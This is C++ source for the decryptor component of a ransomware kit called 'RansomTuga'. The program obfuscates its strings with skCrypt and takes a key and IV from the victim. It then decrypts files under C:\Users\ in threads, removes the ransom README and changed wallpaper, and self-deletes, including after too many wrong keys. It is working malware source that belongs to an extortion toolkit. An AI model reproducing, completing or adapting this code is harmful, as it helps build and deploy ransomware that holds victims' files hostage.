#include "headers.h"

using namespace std;

string logo = (std::string)skCrypt(
    "  /$$$$$$$$                            /$$$$$$$                                                      /$$\n"
    " |__  $$__/                           | $$__  $$                                                    | $$\n"
    "    | $$ /$$   /$$  /$$$$$$   /$$$$$$ | $$  \\ $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$\n"
    "    | $$| $$  | $$ /$$__  $$ |____  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$| $$  | $$ /$$__  $$|_  $$_/   /$$__  $$ /$$__  $$\n"
    "    | $$| $$  | $$| $$  \\ $$  /$$$$$$$| $$  | $$| $$$$$$$$| $$      | $$  \\__/| $$  | $$| $$  \\ $$  | $$    | $$  \\ $$| $$  \\__/\n"
    "    | $$| $$  | $$| $$  | $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      | $$  | $$| $$  | $$  | $$ /$$| $$  | $$| $$\n"
    "    | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$|  $$$$$$$| $$      |  $$$$$$$| $$$$$$$/  |  $$$$/|  $$$$$$/| $$\n"
    "    |__/ \\______/  \\____  $$ \\_______/|_______/  \\_______/ \\_______/|__/       \\____  $$| $$____/    \\___/   \\______/ |__/\n"
    "                   /$$  \\ $$                                                   /$$  | $$| $$\n"
    "                  |  $$$$$$/                                                  |  $$$$$$/| $$\n"
    "                   \\______/                                                    \\______/ |__/\n"
);

int main(int argc, char* argv[])
{
    CreateMutexA(0, FALSE, skCrypt("Local\\$a9wn8CbOoxY3TLuSKWvvlw==$"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        exit(0);

    system(skCrypt("title RansomTuga - TugaDecryptor"));
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);
    MoveWindow(console, r.left, r.top, 1068, 530, TRUE);

    int retries = 0;
    string in = (string)skCrypt("");
    string key = (string)skCrypt("");
    string iv = (string)skCrypt("");
    while (true) {
        retries += 1;

        if (MAX_RETRIES && retries > NUMBER_RETRIES) {
            if (SELFKILL_RETRIES && !DEBUG && argc > 0)
                DeleteMe((string)argv[0]);
            break;
        }
        
        cout << logo << skCrypt("\n\n\n");
        cout << skCrypt("Type decryption key: ");
        if (argc >= 3) {
            in = argv[2];
            cout << in << skCrypt("\n");
        }
        else
            cin >> in;
        
        key = Split(in, '\\')[0];
        iv = Split(in, '\\')[1];

        if (key.size() == 32 && iv.size() == 16 && CheckKey(key, iv)) {
            remove((CHECKSUM_FILE + FILE_EXTENSION).c_str());
            break;
        }
            
        system(skCrypt("cls"));
    }

    
    string dir;
#if !DEBUG
    dir = (string)skCrypt("C:\\Users\\");
#else 
    if (argc > 1)
        dir = argv[1];
    else if (FileExists(DEBUG_FOLDER))
        dir = DEBUG_FOLDER;
    else
        dir = (string)skCrypt(".\\");
#endif

    vector<vector<string>> filesSplitted = VectorSplitter(GetFiles(dir), MAX_THREADS);


    // DECRYPT FILES IN THREADS
    thread threads[MAX_THREADS];
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i] = thread(DecryptFiles, filesSplitted[i], key, iv);
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i].join();


#if DROP_README
    if (remove(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
        DeleteFileA(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
#endif

#if CHANGE_WALLPAPER
    RestoreWallpaper();
    if (remove((NEWWALLPAPER).c_str()) != 0)
        DeleteFileA((NEWWALLPAPER).c_str());
#endif

    cout << skCrypt("Thank you for choosing RansomTuga!\n\n");
    system(skCrypt("pause"));

#if !DEBUG && SELFKILL
    if (argc > 0)
        DeleteMe((string)argv[0]);
#endif

    return 0;
}
